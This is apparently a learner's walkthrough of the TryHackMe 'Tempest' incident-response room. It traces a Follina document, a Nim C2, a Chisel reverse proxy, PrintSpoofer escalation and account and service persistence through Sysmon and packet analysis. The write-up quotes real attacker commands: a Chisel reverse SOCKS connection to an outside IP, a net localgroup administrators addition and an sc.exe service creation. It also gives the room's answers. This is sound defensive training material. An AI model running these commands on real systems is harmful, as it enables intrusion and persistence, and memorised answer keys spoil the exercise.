# Tempest

![Tempest](assets/Tempest.png)

You are tasked to conduct an investigation from a workstation affected by a full attack chain.

## Task 4 - Initial Access - Malicious Document

### Tempest Incident

In this incident, you will act as an Incident Responder from an alert triaged by one of your Security Operations Center analysts. The analyst has confirmed that the alert has a **CRITICAL** severity and requires further investigation.

According to the SOC analyst, the intrusion started from a **malicious document**. The analyst compiled essential information generated by the alert, as listed below:

- The malicious document has a `.doc` extension.
- The user downloaded the malicious document via `chrome.exe`.
- The malicious document then executed a chain of commands to achieve code execution.

**Answer the questions below:**

### 4.1 The user of this machine was compromised by a malicious document. What is the file name of the document?

To begin, I converted the `sysmon.evtx` file to CSV format using the `EvtxEcmd` tool. I ran the following command:

```bash
.\EvtxECmd.exe -f 'C:\Users\user\Desktop\Incident Files\sysmon.evtx' --csv 'C:\Users\user\Desktop\Incident Files' --csvf sysmon.csv
```
Afterward, I opened the sysmon.csv file using Timeline Explorer and searched for any .doc files. I scrolled through the results and found the file name under the payload Data4 field.

![document filename](assets/Task4_screenshot2.png) 

**ANS:free_magicules.doc**

### 4.2 What is the name of the compromised user and machine?

From the previous step, I already identified the malicious document file as being downloaded by the user benimaru. To find the machine name, I simply searched the username column in the CSV file.

![username](assets/Task4_screenshot3.png)

**ANS: benimaru-TEMPEST**

### 4.3 What is the PID of the Microsoft Word process that opened the malicious document?

Looking at the executable info column, I identified that Microsoft Word was used to open the document. I followed the row to the column that contained the Process ID (PID).

**ANS: 496**

### 4.4 Based on Sysmon logs, what is the IPv4 address resolved by the malicious domain used in the previous question?

I made use of the sysmon view to search for it

![IPv4 address](assets/Task4_screenshot4.png)

**ANS: 167.71.199.191**

### 4.5 What is the base64 encoded string in the malicious payload executed by the document?

I filtered my search within Timeline Explorer by the username (benimaru) and PID (496). This allowed me to find the exact row related to the execution of the malicious payload. I then opened the executable info column and copied the base64 string.

![base64 string](assets/Task4_screenshot5.png)

### 4.6 What is the CVE number of the exploit used by the attacker to achieve a remote code execution?

Based on the hint that the payload was executed by msdt.exe, I performed a quick search online for "msdt.exe exploit" 

![CVE number](assets/Task4_screenshot6.png)

**ANS: 2022-30190** 

---

## Task 5: Initial Access - Stage 2 execution

Malicious Document - Stage 2

Based on the initial findings, we discovered that there is a stage 2 execution:

The document has successfully executed an encoded base64 command.
Decoding this string reveals the exact command chain executed by the malicious document.

**Answer the questions below**

### 5.1 The malicious execution of the payload wrote a file on the system. What is the full target path of the payload?

I decoded the base64 string using CyberChef and found the path. However, the path had a variable `$app`, which I changed to the actual user directory path: `C:\Users\benimaru\AppData\Roaming`.

![payload path](assets/Task5_screenshot1.png)

**ANS: C:\Users\benimaru\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup**

### 5.2 The implanted payload executes once the user logs into the machine. What is the executed command upon a successful login of the compromised user?

To find the command executed at login, I filtered by `powershell` in Timeline Explorer. After locating the relevant entry, I reviewed the command and found the one executed during user login.

![executed command](assets/Task5_screenshot2a.png)

![executed command](assets/Task5_screenshot2b.png)

### 5.3 Based on Sysmon logs, what is the SHA256 hash of the malicious binary downloaded for stage 2 execution?

I identified that the downloaded file was `first.exe`. I traced the row in Timeline Explorer to the column containing the file hashes and located the relevant SHA256 hash.

![filehash](assets/Task5_screenshot3b.png)

**ANS: CE278CA242AA2023A4FE04067B0A32FBD3CA1599746C160949868FFC7FC3D7D8**

### 5.4 The stage 2 payload downloaded establishes a connection to a c2 server. What is the domain and port used by the attacker?

I observed several DNS queries associated with the stage 2 payload. By experimenting with port 80, I successfully matched the correct connection to the C2 server.

![domain and port](assets/Task5_screenshot4.png)

**ANS: resolvecyber.xyz:80** 

---
## Task 6 - Initial Access - Malicious Document Traffic

Based on the collected findings, we discovered that the attacker fetched the stage 2 payload remotely:

We discovered the Domain and IP invoked by the malicious document on Sysmon logs.
There is another domain and IP used by the stage 2 payload logged from the same data source.

**Answer the questions below**

### 6.1 What is the URL of the malicious payload embedded in the document?

To identify the URL of the malicious payload, I analyzed the network logs using Wireshark. I filtered the traffic based on the domains I had already identified and applied the following display filter:
```
“http.host == "phishteam.xyz" && http.request.method=”GET”
```
So I was able to get my answer. 

![URL of malicious payload](assets/Task6_screenshot1.png)

**ANS: http://phishteam.xyz/02dcf07/index.html**

### 6.2 What is the encoding used by the attacker on the c2 connection?

While analyzing the network traffic, I filtered for the domain `resolvecyber.xyz`. I observed a connection that appeared to contain an encoded parameter starting with `q=`. This seemed like a base64 encoding, so I confirmed this by decoding it using CyberChef.

![encoding used](assets/Task6_screenshot2.png)

**ANS: base64**

### 6.3 The malicious c2 binary sends a payload using a parameter that contains the executed command results. What is the parameter used by the binary?

In the previous question, I identified that the `q` parameter was used by the C2 binary to send command results back to the attacker.

### 6.4 The malicious c2 binary connects to a specific URL to get the command to be executed. What is the URL used by the binary?

Based on the captured traffic in the previous question, I identified the URL used by the C2 binary to retrieve commands to execute.
Check the screenshot in 6.2 above

**ANS: /9ab62b5**

### 6.5 What is the HTTP method used by the binary?

**ANS: GET**

### 6.6 Based on the user agent, what programming language was used by the attacker to compile the binary?

The `User-Agent` field in the packet details provided the name of the programming language used by the attacker. It revealed that the binary was compiled using the `Nim` programming language.

![programming language used](assets/Task6_screenshot3.png)

**ANS: nim**

---

## Task 7: Discovery - Internal Reconnaissance

Based on the collected findings, we have discovered that the malicious binary continuously uses the C2 traffic:

We can easily decode the encoded string in the network traffic.
The traffic contains the command and output executed by the attacker.

**Answer the questions below**

### 7.1 The attacker was able to discover a sensitive file inside the machine of the user. What is the password discovered on the aforementioned file?

This was a try and error method. I knew the base64 commands contained what I was looking for but I didn’t know the exact one so I decided to try and decoding different ones on cyberchef. I was lucky and found it on my 4th trial. 

![password](assets/Task7_screenshot1.png)

**ANS: infernotempest**

### 7.2 The attacker then enumerated the list of listening ports inside the machine. What is the listening port that could provide a remote shell inside the machine?

For this, I looked for a very long base64 encoded command since what I was looking for is a list of ports, luckily for me, it was the next command after the previous one so I copied and used cyberchef to bake it
Then I figured the attacker was running netstat. Then I copied the output and asked chatGPT which port could provide a remote shell inside a machine and I found my answer of interest. 

Port 5985 : This is typically associated with WinRM (Windows Remote Management), which provides a shell interface for remote management over HTTP. 

![listening port](assets/Task7_screenshot2a.png)

![listening port](assets/Task7_screenshot2b.png)

**ANS: 5985**

### 7.3 The attacker then established a reverse socks proxy to access the internal services hosted inside the machine. What is the command executed by the attacker to establish the connection?

In the timeline explorer, I reviewed the executable information and found the command used by the attacker to establish the reverse SOCKS proxy connection.

![command executed to establish connection](assets/Task7_screenshot3.png)

**ANS: C:\Users\benimaru\Downloads\ch.exe client 167.71.199.191:8080 R:socks**

### 7.4 What is the SHA256 hash of the binary used by the attacker to establish the reverse socks proxy connection?

Just had to scroll to the left a little to find the hash

**ANS: 8A99353662CCAE117D2BB22EFD8C43D7169060450BE413AF763E8AD7522D2451**

### 7.5 What is the name of the tool used by the attacker based on the SHA256 hash? Provide the answer in lowercase.

Using VirusTotal, I searched for the SHA256 hash and identified the tool used by the attacker as `Chisel`.

![tool used by attacker](assets/Task5_screenshot4.png)

**ANS: chisel**

### 7.6 The attacker then used the harvested credentials from the machine. Based on the succeeding process after the execution of the socks proxy, what service did the attacker use to authenticate?

The succeeding process showing in my Time explorer was not what THM was looking for so I had to make use of help online. I saw the required process and the checked what the process means. The PowerShell host wsmprovhost.exe is a proxy process executed remotely through PowerShell when using Windows Remote Management (WinRM)

![process](assets/Task7_screenshot5.png)

**ANS: winrm**

---
## Task 8 : Privilege Escalation - Exploiting Privileges

Based on the collected findings, the attacker gained a stable shell through a reverse socks proxy.

**Answer the questions below**

### 8.1 After discovering the privileges of the current user, the attacker then downloaded another binary to be used for privilege escalation. What is the name and the SHA256 hash of the binary?

From the Timeline explorer and also from my previous wireshark capture, I saw another binary which was spf.exe. I just had to look for the binary again and check the hash. 

![binary name and hash](assets/Task8_screenshot1a.png)

![binary name and hash](assets/Task8_screenshot1b.png)

**ANS: spf.exe,8524FBC0D73E711E69D60C64F1F1B7BEF35C986705880643DD4D5E17779E586D**

### 8.2 Based on the SHA256 hash of the binary, what is the name of the tool used?

I checked the SHA256 hash on VirusTotal and identified the tool used as `printspoofer`.

![tool used](Task8_screenshot2.png)

**ANS: printspoofer**

### 8.3 The tool exploits a specific privilege owned by the user. What is the name of the privilege?

I googled the tool and found the privilege it exploits.

![privilege the tool exploits](assets/Task8_screenshot3.png)

**ANS: SeImpersonatePrivilege** 

### 8.4 Then, the attacker executed the tool with another binary to establish a c2 connection. What is the name of the binary?

If you check the screenshot in Task 8.1, The `spf.exe` binary was used in combination with another binary named `final.exe` to establish the C2 connection.

**ANS: final.exe**

### 8.5 The binary connects to a different port from the first c2 connection. What is the port used?

Back to wireshark, the attacker used a different port but the destination remains the same so I filtered for the destination IP address and identified the port used for the C2 connection as `8080`.

![port used](assets/Task8_screenshot4.png)

**ANS: 8080**

## Task 9: Actions on Objective - Fully-owned Machine

Now, the attacker has gained administrative privileges inside the machine. Find all persistence techniques used by the attacker.

In addition, the unusual executions are related to the malicious C2 binary used during privilege escalation.

**Answer the questions below**

### 9.1 Upon achieving SYSTEM access, the attacker then created two users. What are the account names?

I reviewed the process execution information in the timeline exploer and filtered my search using `net`. This allowed me to isolate the commands related to user creation. The attacker created two accounts: `shion` and `shuna`.


![users added](assets/Task9_screenshot1.png)

**ANS: shion,shuna**

### 9.2 Prior to the successful creation of the accounts, the attacker executed commands that failed in the creation attempt. What is the missing option that made the attempt fail?

**ANS: /add**

### 9.3 Based on windows event logs, the accounts were successfully created. What is the event ID that indicates the account creation activity?

**ANS: 4720**

### 9.4 The attacker added one of the accounts in the local administrator's group. What is the command used by the attacker?

In my previous screenshot, you will find the one with localgroup admin where a user was added. 

**ANS: net localgroup administrators /add shion**

### 9.5 Based on windows event logs, the account was successfully added to a sensitive group. What is the event ID that indicates the addition to a sensitive local group?

**ANS: 4732**

### 9.6 After the account creation, the attacker executed a technique to establish persistent administrative access. What is the command executed by the attacker to achieve this?

For persistence, I guessed it will be a scheduled task or a service installation and will have to do with the final.exe binary. So I searched for final.exe and I found a scheduled task!!

![persistent access](assets/Task9_screenshot2.png)

**ANS: C:\Windows\system32\sc.exe \\TEMPEST create TempestUpdate2 binpath= C:\ProgramData\final.exe start= auto**

---

## Conclusion:
This investigation has covered the full scope of the attacker's actions, from initial infection and C2 communication to privilege escalation and persistence on the target machine. By analyzing the network traffic, system processes, and event logs, I was able to uncover the tools, techniques, and commands used by the attacker at each stage.
